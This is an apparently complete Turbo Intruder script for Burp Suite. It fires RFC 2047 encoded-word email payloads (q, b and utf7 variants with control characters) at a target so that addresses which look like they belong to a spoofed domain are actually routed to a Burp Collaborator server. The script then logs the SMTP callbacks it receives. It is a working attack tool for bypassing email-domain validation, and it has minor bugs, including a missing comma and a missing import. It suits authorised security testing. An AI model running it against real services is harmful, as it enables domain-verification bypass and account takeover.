import base64
import urllib

REQUEST_SLEEP = 1
COLLAB_SLEEP = 10


payloads = ["=?x?q?$collab1=40$collabServer=3e=00?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=01?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=02?=foo@$validServer"
            "=?x?q?$collab1=40$collabServer=3e=03?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=04?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=05?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=07?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=08?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=0e?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=0f?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=10?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=11?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=13?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=15?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=16?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=17?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=19?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=1a?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=1b?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=1c?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=1d?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=1f?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=20?=foo@$validServer", "=?x?q?$collab1=40$collabServer=2c?=x@$validServer",
            "=?utf7?q?$collab1&AEA-$collabServer&ACw-?=x@$validServer","=?utf7?q?$collab1&AEA-$collabServer&ACw=/xyz!-?=x@$validServer",
            "=?utf7?q?$collab1=26AEA-$collabServer=26ACw-?=x@$validServer","$collab1=?utf7?b?JkFFQS0?=$collabServer=?utf7?b?JkFDdy0?=x@$validServer","$collab1=?x?b?QA==?=$collabServer=?x?b?LA==?=x@$validServer"
           ]
           
invalidServer = "blah.blah"
validServer = "iwantto.spoof"
shouldUrlEncode = False
collab = callbacks.createBurpCollaboratorClientContext()
collabServer = collab.getCollaboratorServerLocation()
mappings = {}

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,                     
                           maxRetriesPerRequest=3
                           )

    for payload in payloads:
        if "$hex" in payload:
            generateHex(0, 255, payload, engine)
        else:  
            manipulated = replacePayload(payload)
            engine.queue(target.req,  urllib.quote_plus(manipulated) if shouldUrlEncode else manipulated)
            time.sleep(REQUEST_SLEEP)
            
    print "Waiting for interactions..."
    counter = 0            
    while counter < 10 and engine.engine.attackState.get() < 3: 
        found = fetchInteractions(collab)
        print "Found " + str(found) + " interactions"
        time.sleep(COLLAB_SLEEP)
        counter += 1
        if found > 0:
            counter = 0
    print "Completed"    

def replacePayload(payload):
    id1 = collab.generatePayload(False)
    id2 = collab.generatePayload(False)
    manipulated = payload
    manipulated = manipulated.replace("$validServer", validServer);
    manipulated = manipulated.replace("$invalidServer", invalidServer);
    manipulated = manipulated.replace("$collabServer", collabServer);
    manipulated = manipulated.replace("$collab1", id1);
    manipulated = manipulated.replace("$collab2", id2);
    mappings[id1] = manipulated
    return manipulated

def generateHex(start, end, payload, engine):
    for chrNum in range(start, end + 1):          
        manipulated = replacePayload(payload)
        manipulated = manipulated.replace("$hex", "{:02x}".format(chrNum));
        engine.queue(target.req,  urllib.quote_plus(manipulated) if shouldUrlEncode else manipulated)
        time.sleep(REQUEST_SLEEP)

def fetchInteractions(collab):
    interactions = collab.fetchAllCollaboratorInteractions()
    found = interactions.size()
    for interaction in interactions:
        smtp = interaction.getProperty('conversation')
        currentInteractionId = interaction.getProperty('interaction_id')
        try:
            original_payload = mappings[currentInteractionId]
        except KeyError:
            print "failed to look up payload for interaction id "+currentInteractionId
            original_payload = 'lookup_failed'
        
        if smtp == None:
            print "Got DNS interaction - not reporting"
            continue

        print "Got SMTP interaction, about to report"
            
        decoded = base64.b64decode(smtp)             
        email = decoded.partition('RCPT TO:<')[2].partition('>\r\n')[0]
        print "Found interaction! " + original_payload + " with interaction " + currentInteractionId      
    return found

def handleResponse(req, interesting):
    table.add(req)